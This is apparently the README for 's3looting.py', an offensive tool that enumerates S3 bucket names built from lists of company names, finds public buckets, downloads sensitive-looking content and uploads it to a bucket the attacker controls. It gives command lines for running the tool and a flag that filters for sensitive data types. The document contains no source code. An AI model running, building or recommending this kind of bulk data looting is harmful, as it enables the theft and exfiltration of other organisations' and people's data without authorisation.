# AWS S3 Bucket Looting

Enumerate over a bucket name list, searching for public buckets, download any interesting content and upload it to an S3 bucket under your control. Either specify the list to enumerate over through flag or pipe it in.

```
python3 s3looting.py -list company_names.txt -bucket mysup3rs3cretbuck3t

python3 generate-permuations {company_name} | python3 s3looting.py -bucket mysup3rs3cretbuck3t
```

If you are looking for something specific, supply a content types list with the `-content` flag. You can find the complete list of types that Macie can assign to objects [here](https://docs.aws.amazon.com/macie/latest/userguide/macie-classify-objects-content-type.html)
